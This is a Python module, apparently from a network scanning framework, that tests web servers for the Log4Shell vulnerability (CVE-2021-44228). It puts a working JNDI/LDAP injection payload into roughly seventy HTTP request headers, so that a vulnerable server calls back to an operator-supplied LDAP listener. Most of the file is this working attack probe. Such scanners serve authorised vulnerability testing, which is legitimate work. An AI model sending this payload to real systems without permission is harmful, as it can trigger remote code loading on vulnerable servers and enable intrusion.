import os.path

from utils.output import Output
from utils.db import DB
from utils.utils import gen_random_string, gen_bruteforce_creds
from lib.httpscan.http import HTTP

from server.vulnerability_callback import VulnCallback

headers = [
    "User-Agent",
    "Referer",
    "X-Api-Version",
    "Accept-Charset",
    "Accept-Datetime",
    "Accept-Encoding",
    "Accept-Language",
    "Forwarded",
    "Forwarded-For",
    "Forwarded-For-Ip",
    "Forwarded-Proto",
    "From",
    "TE",
    "True-Client-IP",
    "Upgrade",
    "Via",
    "Warning",
    "X-Api-Version",
    "Max-Forwards",
    "Origin",
    "Pragma",
    "DNT",
    "Cache-Control",
    "X-Att-Deviceid",
    "X-ATT-DeviceId",
    "X-Correlation-ID",
    "X-Csrf-Token",
    "X-CSRFToken",
    "X-Do-Not-Track",
    "X-Foo",
    "X-Foo-Bar",
    "X-Forwarded",
    "X-Forwarded-By",
    "X-Forwarded-For",
    "X-Forwarded-For-Original",
    "X-Forwarded-Host",
    "X-Forwarded-Port",
    "X-Forwarded-Proto",
    "X-Forwarded-Protocol",
    "X-Forwarded-Scheme",
    "X-Forwarded-Server",
    "X-Forwarded-Ssl",
    "X-Forwarded-For",
    "X-Forward-For",
    "X-Forward-Proto",
    "X-Frame-Options",
    "X-From",
    "X-Geoip-Country",
    "X-Http-Destinationurl",
    "X-Http-Host-Override",
    "X-Http-Method",
    "X-Http-Method-Override",
    "X-HTTP-Method-Override",
    "X-Http-Path-Override",
    "X-Https",
    "X-Htx-Agent",
    "X-Hub-Signature",
    "X-If-Unmodified-Since",
    "X-Imbo-Test-Config",
    "X-Insight",
    "X-Ip",
    "X-Ip-Trail",
    "X-ProxyUser-Ip",
    "X-Requested-With",
    "X-Request-ID",
    "X-UIDH",
    "X-Wap-Profile",
    "X-XSRF-TOKEN",
]

class Module:
    name = 'Log4J'
    description = 'Attempt a Log4shell exploit payload [Experimental]'

    def run(self, target, args, useragent, proxy, timeout, safe):
        http = HTTP(target['method'], target['hostname'], target['port'], useragent, proxy, timeout)

        if len(args['args']) != 1:
            Output.error({'target': http.url(target['path']), 'message': 'Log4J module requires 1 arg: ldap_listener_ip:port'})
            return

        vuln_info = {
            'hostname': target['hostname'],
            'port': target['port'],
            'service': 'http',
            'url': http.url(target['path']),
            'name': 'CVE-2021-44228 (Log4Shell)',
            'description': 'Server %s is vulnerable to CVE-2021-44228 (Log4Shell)' % (http.url(target['path']),),
        }

        vuln_id = VulnCallback.new_vulnerability_check(vuln_info)

        payload = "${jndi:ldap://%s/vuln/%s}" % (args['args'][0], vuln_id)

        query_headers = {}
        for h in headers:
            query_headers[h] = payload

        http.get(target['path'], headers=query_headers)

